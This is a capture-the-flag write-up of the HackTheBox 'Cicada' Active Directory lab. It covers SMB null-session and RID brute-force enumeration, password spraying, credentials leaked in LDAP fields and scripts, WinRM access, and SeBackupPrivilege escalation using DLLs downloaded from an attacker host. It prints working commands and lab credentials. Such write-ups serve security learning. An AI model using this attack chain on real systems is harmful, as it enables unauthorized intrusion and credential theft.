## Reconnaissance

Add the IP address of the machine to `/etc/hosts`:

`nano /etc/hosts`

![[HackTheBox/Cicada/images/1.png]]

---

## Port Scanning

Conduct port scan:

`sudo nmap -sV -sC cicada.htb`,
`sudo nmap -sV -p- --max-rate 10000 cicada.htb`

Observe that I was dealing with AD structure:

![[HackTheBox/Cicada/images/9.png]]

![[HackTheBox/Cicada/images/2.png]]

Domain Controller Hostname:
`commonName=CICADA-DC.cicada.htb`

Domain:
`cicada.htb`

Plus, **Microsoft HTTPAPI** + **port 5985** combination refers to `WinRM` service.

![[HackTheBox/Cicada/images/3.png]]

Lastly, SMB ports are shown. I'll try password sprays and null session.

![[HackTheBox/Cicada/images/4.png]]

---

## SMB Enumeration — Null Sessions & RID Brute-Forcing

Now let's enumerate `SMB` shares via null sessions:

[NetExec SMB Share Enum](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions)

`nxc smb cicada.htb -u '' -p ''`

![[HackTheBox/Cicada/images/5.png]]

I also found that a cheatsheet for `null session` enum, yet I did not know actually about `RID` what does that mean and so on... Check from here:

[Null Enum](https://notes.benheater.com/books/active-directory/page/null-session-enumeration)

On that page, there was another parameter `--rid-brute 3000`. 3000 is specified as the permissions that the account holds.

[RID Explanation](https://graylog.org/post/adversary-tradecraft-a-deep-dive-into-rid-hijacking-and-hidden-users/)

![[HackTheBox/Cicada/images/6.png]]

Basically, we are asking DC, "Who is 500, 3000, 1001?" through `SMB`.

I tried different combinations with `NULL session` and `Enumerate Guest`.

[Guest Logon](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon)

`nxc smb cicada.htb -u '' -p ''`
`nxc smb cicada.htb -u '' -p '' --users`
`nxc smb cicada.htb -u 'CTIS' -p '' --users`

![[HackTheBox/Cicada/images/7.png]]

I identified that the `Guest` account was enabled, but I didn't know how to enum the guest account.

`nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`

It is clear that by combination of `non-existing` user and `--rid-brute`, I found the entire user accounts that exist in the domain.

`nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`

![[HackTheBox/Cicada/images/8.png]]

This cheatsheet recommends the usage of `-u 'guest'` as well. Let's try:

[SMB Cheatsheet](https://0xdf.gitlab.io/cheatsheets/smb-enum)

`nxc smb cicada.htb -u 'guest' -p '' --shares`

![[HackTheBox/Cicada/images/10.png]]

---

## Harvesting Credentials from SMB Shares

Thanks to the `HR` department share, I can read its belonging contents.

I used `netexec` spider modules to fuzz contents of shares:

[Spider Module](https://www.netexec.wiki/smb-protocol/spidering-shares)

`nxc smb cicada.htb -u 'guest' -p '' -M spider_plus`

![[HackTheBox/Cicada/images/11.png]]

I discovered a `.txt` file belonging to HR:

```bash
{
    "HR": {
        "Notice from HR.txt": {
            "atime_epoch": "2024-08-28 20:31:48",
            "ctime_epoch": "2024-03-14 15:29:03",
            "mtime_epoch": "2024-08-28 20:31:48",
            "size": "1.24 KB"
        }
    }
}
```

I cannot authenticate `SMB` through the `guest` user account, so I also used a random non-existing string to authenticate to the HR share:

![[HackTheBox/Cicada/images/12.png]]

`smbclient //10.129.231.149/HR -U 'CTIS' -N`

`ls -> get "Notice from HR.txt"`

![[HackTheBox/Cicada/images/13.png]]

![[HackTheBox/Cicada/images/14.png]]

---

## Password Spraying

As we found AD user accounts, let's try to brute them via the `password spraying` technique. In real world tests, I have never seen such a RID thing; instead, we try to guess the most suitable ones.

I created my user files as below:

john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

[Pass Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)

Succeeded as `michael` account:

![[HackTheBox/Cicada/images/15.png]]

With also `--continue-on-success` param:

![[HackTheBox/Cicada/images/16.png]]

---

## LDAP Enumeration & Lateral Movement

I never have a methodology, but simply dive into `ldap search`.

netexec also provides an `ldap` option:

[Nxc LDAP Protocol](https://www.netexec.wiki/ldap-protocol/authentication)

`nxc ldap cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

![[HackTheBox/Cicada/images/17.png]]

David leaks his password in the `Description` field.

`david.orelious:aRt$Lp#7t*VQ!3`

`nxc ldap cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --users`

Let's find anything valuable on `SMB` for David:

`nxc smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`

![[HackTheBox/Cicada/images/18.png]]

Observe that David's account can `READ` the DEV share. Now I will auth as David to shares via `smbclient`:

`smbclient //10.129.231.149/DEV -U 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`

I found a PowerShell script in David's share:

![[HackTheBox/Cicada/images/19.png]]

Emily user's hardcoded credentials can be observed:

![[HackTheBox/Cicada/images/20.png]]

---

## Getting User Flag — WinRM Access

`nxc smb cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares`

Emily is a highly privileged account — just an assumption based on `READ,WRITE` perms on Disk access (C$) and admin share read utilities:

![[HackTheBox/Cicada/images/21.png]]

I will access through the WinRM protocol instead of SMB.

`smbclient //10.129.231.149/ADMIN$ -U 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

![[HackTheBox/Cicada/images/22.png]]

Use Hackviser's guide:

[EvilWinRM](https://hackviser.com/tactics/pentesting/services/winrm)

`evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

Get user flag from Emily's `Desktop`:

![[HackTheBox/Cicada/images/23.png]]

---

## Privilege Escalation — SeBackupPrivilege Abuse

Ask Domain Controller for the AD profile of the user.

`net user emily.oscars /domain`

![[HackTheBox/Cicada/images/24.png]]

Notice that the user has the `Backup Operators` tag — most likely a highly privileged account.

![[HackTheBox/Cicada/images/25.png]]

I will shift tokens directly.

![[HackTheBox/Cicada/images/26.png]]

Backup privilege available on target.

I will follow the description below:

[SeBackupPrivilege](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

![[HackTheBox/Cicada/images/27.png]]

![[HackTheBox/Cicada/images/31.png]]

I tried `Acl-FullControl` PowerShell, but it still did not work properly.

![[HackTheBox/Cicada/images/28.png]]

![[HackTheBox/Cicada/images/29.png]]

Now I applied:

```bash
1. Import necessary libraries:

`Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll`

2. Enable and verify `SeBackupPrivilege`:

`Set-SeBackupPrivilege Get-SeBackupPrivilege`

3. Access and copy files from restricted directories, for instance:

`dir C:\Users\Administrator\ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite`
```

For `SeBackupPrivilegeUtils.dll`:

```bash
$URL = "http://10.10.16.64:1000/SeBackupPrivilegeUtils.dll"
$Path="C:\Users\emily.oscars.CICADA\backuputils.dll"
Invoke-WebRequest -URI $URL -OutFile $Path
```

For `SeBackupPrivilegeCmdLets.dll`:

```bash
$URL = "http://10.10.16.64:1000/SeBackupPrivilegeCmdLets.dll"
$Path="C:\Users\emily.oscars.CICADA\backupcmdlets.dll"
Invoke-WebRequest -URI $URL -OutFile $Path
```

![[HackTheBox/Cicada/images/30.png]]

Import modules and set privileges.

Then copy the restricted file to an unrestricted zone:

`Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\root.txt -Overwrite`

Finally, get root flag:

![[HackTheBox/Cicada/images/32.png]]

